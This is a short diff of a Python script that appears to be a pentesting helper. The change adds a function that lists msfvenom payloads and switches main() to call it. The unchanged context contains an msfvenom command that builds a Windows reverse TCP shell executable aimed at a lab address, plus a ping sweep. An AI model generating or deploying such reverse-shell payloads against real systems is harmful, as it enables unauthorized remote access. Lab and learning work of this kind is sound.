@@ -20,6 +20,13 @@ def windows_reverse_payload():
     return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
     print("output:", return_code)
 
+def check_var():
+    program = 'msfvenom'
+    arg_one = '-l'
+    arg_two = 'payloads'
+    return_code = subprocess.call([program,arg_one,arg_two])
+    print("output:", return_code)
+
 def get_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
@@ -37,7 +44,7 @@ def ping_sweep():
 
 ### MAIN FUNCTION ###
 def main():  # define a main function
-    ping_sweep()
+    check_var()
     # windows_reverse_payload()
     # get_ip()
     # open_payloads()
